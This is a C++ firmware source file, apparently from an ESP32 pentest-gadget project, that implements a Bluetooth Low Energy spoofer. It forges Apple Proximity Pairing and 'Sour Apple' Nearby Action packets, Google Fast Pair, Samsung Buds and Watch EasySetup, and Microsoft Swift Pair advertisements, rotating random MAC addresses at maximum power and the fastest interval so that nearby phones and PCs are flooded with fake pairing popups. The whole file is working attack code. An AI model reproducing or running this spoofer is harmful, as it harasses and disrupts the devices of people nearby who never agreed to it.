// ═══════════════════════════════════════════════════════════════════════════
// HaleHound BLE Spoofer — implementation
// Created: 2026-09-21 (Cardputer ADV port — on-chip BLE attacks)
// Shared unchanged with the T-Embed CC1101 build since 2026-09-22 — see
// ble_spoofer.h for why this file needed no board branch to port.
// See ble_spoofer.h for the full port/fidelity writeup. Structurally this is
// ble_jammer.cpp's worker-task/Cmd-queue shape wrapped around
// bluetooth_attacks.cpp's BleSpoofer::doBroadcast() broadcast core and
// device-signature tables, ported verbatim; BLE lifecycle (WiFi off, Classic
// BT memory release, BLEDevice::init/deinit) follows lunatic_fringe.cpp's
// worker exactly since both are on-chip-BLE features on both boards.
// ═══════════════════════════════════════════════════════════════════════════

#include "ble_spoofer.h"
#include <Arduino.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <esp_random.h>
#include <esp_system.h>  // esp_get_free_heap_size() — heap-safety check in the worker loop
#include "cyd_config.h"
#include "messaging.h"
#include "radio_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

// ═══════════════════════════════════════════════════════════════════════════
// SPAM MODES — ported from BleSpoofer::SpamMode
// ═══════════════════════════════════════════════════════════════════════════

enum SpamMode {
    MODE_APPLE_POPUP = 0,
    MODE_SOUR_APPLE,
    MODE_FAST_PAIR,
    MODE_SAMSUNG_BUDS,
    MODE_SAMSUNG_WATCH,
    MODE_SWIFT_PAIR,
    MODE_CHAOS,
    MODE_COUNT  // 7
};

static const char* MODE_NAMES[] = {
    "APPLE POPUP",
    "SOUR APPLE",
    "FAST PAIR",
    "SAMSUNG BUDS",
    "SAMSUNG WATCH",
    "SWIFT PAIR",
    "CHAOS"
};

// ═══════════════════════════════════════════════════════════════════════════
// APPLE POPUP - Proximity Pairing (Type 0x07)
// Triggers "Your [Device] is nearby" popup on iPhones/iPads
// ═══════════════════════════════════════════════════════════════════════════

#define APPLE_COUNT 20

static const uint8_t APPLE_MODELS[APPLE_COUNT] = {
    0x02,  // AirPods
    0x0E,  // AirPods Pro
    0x0A,  // AirPods Max
    0x0F,  // AirPods Gen 2
    0x13,  // AirPods Gen 3
    0x14,  // AirPods Pro Gen 2
    0x19,  // AirPods 4
    0x24,  // AirPods Max USB-C
    0x03,  // PowerBeats 3
    0x0B,  // PowerBeats Pro
    0x0C,  // Beats Solo Pro
    0x11,  // Beats Studio Buds
    0x10,  // Beats Flex
    0x05,  // BeatsX
    0x06,  // Beats Solo 3
    0x09,  // Beats Studio 3
    0x17,  // Beats Studio Pro
    0x12,  // Beats Fit Pro
    0x16,  // Beats Studio Buds+
    0x1C   // PowerBeats Pro 2
};

static const char* APPLE_NAMES[APPLE_COUNT] = {
    "AirPods", "AirPods Pro", "AirPods Max", "AirPods Gen2", "AirPods Gen3",
    "AirPods Pro2", "AirPods 4", "AirPods MaxC", "PowerBeats3", "PowerBeatsPro",
    "Solo Pro", "Studio Buds", "Beats Flex", "BeatsX", "Beats Solo3",
    "Beats Studio3", "Studio Pro", "Beats FitPro", "Studio Buds+", "PBeatsPro2"
};

// ═══════════════════════════════════════════════════════════════════════════
// SOUR APPLE - Nearby Action (Type 0x0F)
// Floods iOS with random action modals (WiFi, AirDrop, HomeKit, etc.)
// ═══════════════════════════════════════════════════════════════════════════

#define SOUR_APPLE_COUNT 14

static const uint8_t SOUR_APPLE_TYPES[SOUR_APPLE_COUNT] = {
    0x01, 0x02, 0x05, 0x06, 0x09, 0x0D, 0x14, 0x1E, 0x20, 0x27, 0x2B, 0x2D, 0x2F, 0xC0
};

static const char* SOUR_APPLE_NAMES[SOUR_APPLE_COUNT] = {
    "New iPhone", "Transfer #", "AirDrop", "HomeKit", "WiFi Pass",
    "AirPlay", "AppleTV", "Handoff", "Setup ATV", "Setup Dev",
    "WiFi Net", "VisionPro", "HomePod", "Nearby"
};

// ═══════════════════════════════════════════════════════════════════════════
// GOOGLE FAST PAIR (Service UUID 0xFE2C)
// Triggers "Device ready to pair" notification on Android
// ═══════════════════════════════════════════════════════════════════════════

#define FAST_PAIR_COUNT 15

static const uint8_t FAST_PAIR_MODELS[FAST_PAIR_COUNT][3] = {
    {0xD9, 0x93, 0x30}, {0x82, 0x1F, 0x66}, {0x71, 0x7F, 0x41}, {0xF5, 0x24, 0x94},
    {0xF0, 0x09, 0x17}, {0x01, 0x00, 0x06}, {0xEF, 0x44, 0x63}, {0x03, 0x1E, 0x06},
    {0x92, 0xB2, 0x5E}, {0x1E, 0x89, 0xA7}, {0x02, 0xAA, 0x91}, {0x2D, 0x7A, 0x23},
    {0xD4, 0x46, 0xA7}, {0x72, 0xEF, 0x62}, {0xF5, 0x8D, 0x14}
};

static const char* FAST_PAIR_NAMES[FAST_PAIR_COUNT] = {
    "Pixel BudsPro", "Pixel BudsA", "Pixel Buds", "Sony XM4", "Sony XM5",
    "Bose NC700", "Bose QC Ultra", "JBL Flip 6", "JBL LivePro2", "Razer HH",
    "Jabra 75t", "Nothing Ear1", "Sony LinkBuds", "Galaxy BudFE", "JBL BudsPro"
};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG BUDS (Company ID 0x0075)
// Triggers Samsung EasySetup pairing popup on Galaxy phones
// ═══════════════════════════════════════════════════════════════════════════

#define SAMSUNG_BUDS_COUNT 20

static const uint8_t SAMSUNG_BUDS_IDS[SAMSUNG_BUDS_COUNT][3] = {
    {0xEE, 0x7A, 0x01}, {0x9B, 0x7A, 0x01}, {0x9B, 0x7A, 0x02}, {0x4E, 0x85, 0x01},
    {0x4E, 0x85, 0x02}, {0x4E, 0x85, 0x03}, {0xA7, 0x2F, 0x01}, {0xA7, 0x2F, 0x02},
    {0xA7, 0x2F, 0x03}, {0x74, 0x87, 0x01}, {0x74, 0x87, 0x02}, {0x74, 0x87, 0x03},
    {0xAE, 0x59, 0x01}, {0xAE, 0x59, 0x02}, {0xAE, 0x59, 0x03}, {0x53, 0xD4, 0x01},
    {0x53, 0xD4, 0x02}, {0xB6, 0xC4, 0x01}, {0xB6, 0xC4, 0x02}, {0x11, 0xA0, 0x01}
};

static const char* SAMSUNG_BUDS_NAMES[SAMSUNG_BUDS_COUNT] = {
    "Galaxy Buds", "Galaxy Buds+", "Buds+ Black", "Buds Live", "Buds Live B",
    "Buds Live W", "Buds Pro", "Buds Pro S", "Buds Pro V", "Buds2",
    "Buds2 White", "Buds2 Purple", "Buds2 Pro", "Buds2 Pro W", "Buds2 Pro G",
    "Buds FE", "Buds FE W", "Buds3", "Buds3 Pro", "Buds+ Rose"
};

// Samsung Buds fixed header and tail bytes for EasySetup protocol
static const uint8_t SAMSUNG_BUDS_HDR[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
static const uint8_t SAMSUNG_BUDS_TAIL[] = {0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG WATCH (Company ID 0x0075)
// Triggers Samsung Watch pairing popup on Galaxy phones
// ═══════════════════════════════════════════════════════════════════════════

#define SAMSUNG_WATCH_COUNT 25

static const uint8_t SAMSUNG_WATCH_IDS[SAMSUNG_WATCH_COUNT] = {
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
    0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14,
    0x15, 0x16, 0x17, 0x18, 0x19
};

static const char* SAMSUNG_WATCH_NAMES[SAMSUNG_WATCH_COUNT] = {
    "Watch4 40", "Watch4 44", "Watch4C 42", "Watch4C 46", "Watch5 40",
    "Watch5 44", "Watch5 Pro", "Watch6 40", "Watch6 44", "Watch6C 43",
    "Watch6C 47", "Watch FE", "Watch Ultra", "Watch4 LTE", "Watch5 LTE",
    "Watch6 LTE", "Active2 40", "Active2 44", "Watch3 41", "Watch3 45",
    "Watch3A 41", "Fit2", "Fit3", "Watch7 40", "Watch7 44"
};

// Samsung Watch fixed header for pairing protocol
static const uint8_t SAMSUNG_WATCH_HDR[] = {0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43};

// ═══════════════════════════════════════════════════════════════════════════
// MICROSOFT SWIFT PAIR (Company ID 0x0006)
// Triggers "New Bluetooth device found" on Windows 10/11
// ═══════════════════════════════════════════════════════════════════════════

#define SWIFT_PAIR_COUNT 10

static const char* SWIFT_PAIR_NAMES[SWIFT_PAIR_COUNT] = {
    "HH Speaker", "BT Mouse", "BT Keyboard", "Headphones", "Controller",
    "Earbuds", "Smart Watch", "Fitness", "BT Adapter", "Soundbar"
};

// Device counts per mode (CHAOS uses all, so 0 here — never indexed directly)
static const int MODE_DEVICE_COUNTS[] = {
    APPLE_COUNT, SOUR_APPLE_COUNT, FAST_PAIR_COUNT, SAMSUNG_BUDS_COUNT,
    SAMSUNG_WATCH_COUNT, SWIFT_PAIR_COUNT, 0
};

// ═══════════════════════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════════════════════

// Persists across Stop()/Start() within a session, same as
// ble_jammer.cpp's s_modeIndex.
static volatile int s_currentMode = MODE_APPLE_POPUP;
static int s_deviceIndex[MODE_COUNT] = {0};
static int s_chaosStep = 0;

static volatile uint32_t s_packetCount = 0;
static volatile uint32_t s_rateWindowCount = 0;
static volatile uint16_t s_currentRate = 0;

static TaskHandle_t s_workerHandle = NULL;
static QueueHandle_t s_cmdQueue = NULL;
static SemaphoreHandle_t s_doneSem = NULL;

#define BLE_SPOOF_STATUS_INTERVAL_MS 250

// ── Classic BT memory release — same helper shape as lunatic_fringe.cpp/
// ble_scan.cpp. Must run before BLEDevice::init() triggers
// esp_bt_controller_init(); harmless (and skipped) if already released by
// an earlier BLE feature this boot.
static bool s_classicBtReleased = false;
static void releaseClassicBtMemory() {
    if (s_classicBtReleased) return;
    esp_err_t err = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
    if (err == ESP_OK) {
        s_classicBtReleased = true;
    }
    #if CYD_DEBUG
    Serial.printf("[BLESPOOF] releaseClassicBtMemory: 0x%x, heap=%u\n", err, ESP.getFreeHeap());
    #endif
}

static int getDeviceCount(int mode) {
    if (mode < 0 || mode >= MODE_COUNT) return 0;
    return MODE_DEVICE_COUNTS[mode];
}

static const char* getDeviceName(int mode, int idx) {
    switch (mode) {
        case MODE_APPLE_POPUP:   return (idx >= 0 && idx < APPLE_COUNT) ? APPLE_NAMES[idx] : "?";
        case MODE_SOUR_APPLE:    return (idx >= 0 && idx < SOUR_APPLE_COUNT) ? SOUR_APPLE_NAMES[idx] : "?";
        case MODE_FAST_PAIR:     return (idx >= 0 && idx < FAST_PAIR_COUNT) ? FAST_PAIR_NAMES[idx] : "?";
        case MODE_SAMSUNG_BUDS:  return (idx >= 0 && idx < SAMSUNG_BUDS_COUNT) ? SAMSUNG_BUDS_NAMES[idx] : "?";
        case MODE_SAMSUNG_WATCH: return (idx >= 0 && idx < SAMSUNG_WATCH_COUNT) ? SAMSUNG_WATCH_NAMES[idx] : "?";
        case MODE_SWIFT_PAIR:    return (idx >= 0 && idx < SWIFT_PAIR_COUNT) ? SWIFT_PAIR_NAMES[idx] : "?";
        case MODE_CHAOS:         return "CHAOS";
        default:                 return "?";
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PAYLOAD GENERATORS — ported byte-for-byte from BleSpoofer's originals
// ═══════════════════════════════════════════════════════════════════════════

// Apple Proximity Pairing (Type 0x07) - triggers iOS "nearby device" popup
static void getApplePopupPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    pkt[0]  = 0x1E;  // AD Length (30 bytes follow)
    pkt[1]  = 0xFF;  // Manufacturer Specific Data
    pkt[2]  = 0x4C;  // Apple Inc (low byte)
    pkt[3]  = 0x00;  // Apple Inc (high byte)
    pkt[4]  = 0x07;  // Proximity Pairing type
    pkt[5]  = 0x19;  // Data length (25)
    pkt[6]  = 0x07;  // Prefix
    pkt[7]  = APPLE_MODELS[idx % APPLE_COUNT];  // Model byte
    pkt[8]  = 0x20;  // Common
    pkt[9]  = 0x75;  // Status
    pkt[10] = 0xAA;  // Battery
    pkt[11] = 0x30;  // Case
    pkt[12] = 0x01;  // Lid
    pkt[13] = 0x00;  // Color
    pkt[14] = 0x00;
    // Fill remaining 16 bytes with random data (makes each packet unique)
    esp_fill_random(&pkt[15], 16);
    advData.addData(std::string((char*)pkt, 31));
}

// Sour Apple Nearby Action (Type 0x0F) - floods iOS with action modals
static void getSourApplePayload(BLEAdvertisementData& advData, int typeIdx) {
    uint8_t pkt[17];
    int i = 0;
    pkt[i++] = 16;    // AD Length (16 bytes follow)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data
    pkt[i++] = 0x4C;  // Apple Inc
    pkt[i++] = 0x00;
    pkt[i++] = 0x0F;  // Nearby Action type
    pkt[i++] = 0x05;  // Length
    pkt[i++] = 0xC1;  // Action flags
    pkt[i++] = SOUR_APPLE_TYPES[typeIdx % SOUR_APPLE_COUNT];
    // Random authentication tag (3 bytes)
    esp_fill_random(&pkt[i], 3);
    i += 3;
    pkt[i++] = 0x00;
    pkt[i++] = 0x00;
    pkt[i++] = 0x10;
    // Random tail (3 bytes)
    esp_fill_random(&pkt[i], 3);
    advData.addData(std::string((char*)pkt, 17));
}

// Google Fast Pair (Service UUID 0xFE2C) - triggers Android pairing notification
static void getFastPairPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[14];
    int i = 0;
    pkt[i++] = 0x02;  // Flags AD: Length
    pkt[i++] = 0x01;  // Flags type
    pkt[i++] = 0x06;  // General Discoverable + BR/EDR Not Supported
    pkt[i++] = 0x03;  // Service UUID list: Length
    pkt[i++] = 0x03;  // Complete 16-bit UUID list type
    pkt[i++] = 0x2C;  // FE2C (little-endian low)
    pkt[i++] = 0xFE;  // FE2C (little-endian high)
    pkt[i++] = 0x06;  // Service Data: Length
    pkt[i++] = 0x16;  // Service Data type
    pkt[i++] = 0x2C;  // FE2C (little-endian low)
    pkt[i++] = 0xFE;  // FE2C (little-endian high)
    const uint8_t* model = FAST_PAIR_MODELS[idx % FAST_PAIR_COUNT];
    pkt[i++] = model[0];
    pkt[i++] = model[1];
    pkt[i++] = model[2];
    advData.addData(std::string((char*)pkt, 14));
}

// Samsung Galaxy Buds (Company ID 0x0075) - triggers Samsung EasySetup popup
static void getSamsungBudsPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    int i = 0;
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    pkt[i++] = 0x1B;  // AD Length = 27 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    memcpy(&pkt[i], SAMSUNG_BUDS_HDR, 10);
    i += 10;
    const uint8_t* id = SAMSUNG_BUDS_IDS[idx % SAMSUNG_BUDS_COUNT];
    pkt[i++] = id[0];
    pkt[i++] = id[1];
    pkt[i++] = 0x01;  // Separator
    pkt[i++] = id[2];
    memcpy(&pkt[i], SAMSUNG_BUDS_TAIL, 10);
    i += 10;
    advData.addData(std::string((char*)pkt, 31));
}

// Samsung Galaxy Watch (Company ID 0x0075) - triggers Samsung Watch pairing popup
static void getSamsungWatchPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[18];
    int i = 0;
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    pkt[i++] = 0x0E;  // AD Length = 14 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    memcpy(&pkt[i], SAMSUNG_WATCH_HDR, 10);
    i += 10;
    pkt[i++] = SAMSUNG_WATCH_IDS[idx % SAMSUNG_WATCH_COUNT];
    advData.addData(std::string((char*)pkt, 18));
}

// Microsoft Swift Pair (Company ID 0x0006) - triggers Windows "device found" popup
static void getSwiftPairPayload(BLEAdvertisementData& advData, int idx) {
    const char* name = SWIFT_PAIR_NAMES[idx % SWIFT_PAIR_COUNT];
    int nameLen = strlen(name);
    if (nameLen > 20) nameLen = 20;  // Stay within 31-byte total limit

    uint8_t pkt[31];
    int i = 0;
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    pkt[i++] = (uint8_t)(6 + nameLen);  // AD Length
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x06;  // Microsoft company ID (low)
    pkt[i++] = 0x00;  // Microsoft company ID (high)
    pkt[i++] = 0x03;  // Swift Pair beacon type
    pkt[i++] = 0x00;  // Sub-scenario: LE only
    pkt[i++] = 0x80;  // Display name flag
    memcpy(&pkt[i], name, nameLen);
    i += nameLen;
    advData.addData(std::string((char*)pkt, i));
}

// ═══════════════════════════════════════════════════════════════════════════
// RAW ESP-IDF ADVERTISING PARAMS (bypasses Arduino wrapper for reliable BLE
// spam) — ported unchanged. ADV_TYPE_NONCONN_IND = non-connectable
// undirected (BLE spam standard). BLE_ADDR_TYPE_RANDOM = new random MAC per
// broadcast cycle. 0x20 interval = 20ms = fastest BLE spec allows.
// ═══════════════════════════════════════════════════════════════════════════

static esp_ble_adv_params_t s_advParams = {
    .adv_int_min = 0x20,
    .adv_int_max = 0x20,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ═══════════════════════════════════════════════════════════════════════════
// BROADCAST ENGINE — ported from BleSpoofer::doBroadcast(). Device
// selection for non-CHAOS modes is auto round-robin instead of the
// original's manually-set index (see ble_spoofer.h for why — no second
// control axis on this board).
// ═══════════════════════════════════════════════════════════════════════════

static void doBroadcast() {
    // Sequence: stop -> setRandAddr -> configDataRaw -> start -> delay -> stop
    esp_ble_gap_stop_advertising();

    // Generate random BLE MAC address
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] |= 0xC0;  // Set top 2 bits for BLE random static address type
    esp_ble_gap_set_rand_addr(addr);

    int currentMode = s_currentMode;
    int broadcastMode = currentMode;
    int broadcastIdx = 0;
    const char* deviceName = "";

    if (currentMode == MODE_CHAOS) {
        // Round-robins the 6 real platforms, random device within each —
        // ported verbatim from the original's CHAOS step.
        broadcastMode = s_chaosStep % (MODE_COUNT - 1);
        int count = getDeviceCount(broadcastMode);
        broadcastIdx = (count > 0) ? random(count) : 0;
        s_chaosStep++;
    } else {
        broadcastIdx = s_deviceIndex[currentMode];
    }

    BLEAdvertisementData advData = BLEAdvertisementData();

    switch (broadcastMode) {
        case MODE_APPLE_POPUP:
            getApplePopupPayload(advData, broadcastIdx);
            deviceName = APPLE_NAMES[broadcastIdx % APPLE_COUNT];
            break;

        case MODE_SOUR_APPLE: {
            // Original always randomizes the action type per packet
            // (doesn't use the sticky device index) — ported verbatim.
            int randType = random(SOUR_APPLE_COUNT);
            getSourApplePayload(advData, randType);
            deviceName = SOUR_APPLE_NAMES[randType];
            break;
        }

        case MODE_FAST_PAIR:
            getFastPairPayload(advData, broadcastIdx);
            deviceName = FAST_PAIR_NAMES[broadcastIdx % FAST_PAIR_COUNT];
            break;

        case MODE_SAMSUNG_BUDS:
            getSamsungBudsPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_BUDS_NAMES[broadcastIdx % SAMSUNG_BUDS_COUNT];
            break;

        case MODE_SAMSUNG_WATCH:
            getSamsungWatchPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_WATCH_NAMES[broadcastIdx % SAMSUNG_WATCH_COUNT];
            break;

        case MODE_SWIFT_PAIR:
            getSwiftPairPayload(advData, broadcastIdx);
            deviceName = SWIFT_PAIR_NAMES[broadcastIdx % SWIFT_PAIR_COUNT];
            break;

        default:
            return;
    }

    // Advance the round-robin device index for next broadcast (this board's
    // stand-in for the original's manual Prev/Next-device touch icons).
    if (currentMode != MODE_CHAOS) {
        int count = getDeviceCount(currentMode);
        if (count > 0) {
            s_deviceIndex[currentMode] = (s_deviceIndex[currentMode] + 1) % count;
        }
    }

    // Set raw advertising data via ESP-IDF (bypasses Arduino wrapper for
    // reliable cycling)
    std::string payload = advData.getPayload();
    esp_ble_gap_config_adv_data_raw((uint8_t*)payload.data(), payload.length());

    // Brief pause for data config to take effect
    delay(1);

    // Start advertising with raw ESP-IDF params
    esp_ble_gap_start_advertising(&s_advParams);

    // Let BLE controller fire advertising events on channels 37/38/39
    // 20ms = at least one full advertising interval
    delay(20);

    // Stop advertising (clean cycle for next random MAC)
    esp_ble_gap_stop_advertising();

    s_packetCount++;
    s_rateWindowCount++;

    // Log first 5 packets to serial for debugging, same as the original
    if (s_packetCount <= 5) {
        Serial.printf("[BLESPOOF] TX #%lu mode=%d dev=%s len=%d addr=%02X:%02X:%02X\n",
            (unsigned long)s_packetCount, broadcastMode, deviceName,
            (int)payload.length(), addr[0], addr[1], addr[2]);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// WORKER TASK — core 0, Cmd-queue stop (same shape as ble_jammer.cpp/
// lunatic_fringe.cpp). Replaces the original's dual-core split (Core 0
// doBroadcast loop / Core 1 Arduino loop() for touch+display) since this
// board's orchestrator (core 1) already just polls RenderMsg telemetry.
// ═══════════════════════════════════════════════════════════════════════════

static void bleSpooferWorkerTask(void* param) {
    (void)param;

    // Kill WiFi completely — it shares the 2.4GHz radio with BLE. Arduino
    // API keeps _esp_wifi_started in sync, same as the original.
    WiFi.mode(WIFI_OFF);
    delay(200);

    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);  // BLE controller needs time to finish internal init

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] BLE stack initialized, max TX power set");
    #endif

    s_packetCount = 0;
    s_rateWindowCount = 0;
    s_currentRate = 0;
    s_chaosStep = 0;

    uint32_t rateStart = millis();
    uint32_t lastStatus = 0;
    bool stop = false;

    for (;;) {
        Cmd cmd;
        while (xQueueReceive(s_cmdQueue, &cmd, 0) == pdTRUE) {
            if (cmd.type == CMD_STOP) {
                stop = true;
                break;
            }
        }
        if (stop) break;

        // Heap safety — BLEAdvertisementData allocates std::string on heap
        if (esp_get_free_heap_size() < 8192) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        doBroadcast();

        uint32_t now = millis();
        if (now - rateStart >= 1000) {
            s_currentRate = (uint16_t)s_rateWindowCount;
            s_rateWindowCount = 0;
            rateStart = now;
        }

        if (now - lastStatus >= BLE_SPOOF_STATUS_INTERVAL_MS) {
            lastStatus = now;
            int mode = s_currentMode;
            const char* devName = (mode == MODE_CHAOS)
                ? "ALL" : getDeviceName(mode, s_deviceIndex[mode]);
            RenderMsg msg;
            msg.kind = RENDER_MSG_STATUS_TEXT;
            snprintf(msg.payload.text, RENDER_MSG_TEXT_MAX, "%s %s #%lu %dpkt/s",
                     MODE_NAMES[mode], devName, (unsigned long)s_packetCount,
                     s_currentRate);
            messagingPostTelemetry(msg);
        }

        // delay(20) inside doBroadcast() already yields; belt and suspenders
        // for the task WDT, same cadence as the original.
        vTaskDelay(1);
    }

    esp_ble_gap_stop_advertising();
    BLEDevice::deinit(false);  // false — deinit(true) never resets initialized flag (library bug)
    WiFi.mode(WIFI_STA);

    radioRelease(RADIO_BLE);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void bleSpooferStart() {
    if (!radioAcquire(RADIO_BLE)) {
        #if CYD_DEBUG
        Serial.println("[BLESPOOF] ERROR: could not acquire radio");
        #endif
        return;
    }

    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(bleSpooferWorkerTask, "ble_spoof", 8192, NULL, 2,
                            &s_workerHandle, 0);
}

void bleSpooferStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}

void bleSpooferAdjustMode(int delta) {
    int idx = s_currentMode;
    idx = (idx + delta + MODE_COUNT) % MODE_COUNT;
    s_currentMode = idx;
}
